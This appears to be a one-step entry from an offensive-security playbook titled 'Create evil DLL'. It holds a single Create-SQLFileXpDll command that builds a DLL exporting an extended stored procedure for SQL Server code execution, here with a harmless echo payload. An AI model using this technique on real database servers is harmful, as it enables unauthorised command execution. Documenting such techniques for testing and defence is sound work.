---
id: ff250d36-8ab9-4701-81b4-b9aba2fc06db
name: Create evil DLL
type: command
executor: bash
data: Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt"
  -ExportName xp_test
output: null
created_at: '2023-04-06T03:56:20.295363+00:00'
updated_at: '2023-04-10T20:36:30.722000+00:00'
---

# Create evil DLL

```bash
Create-SQLFileXpDll -OutFile C:\temp\test.dll -Command "echo test > c:\temp\test.txt" -ExportName xp_test
```


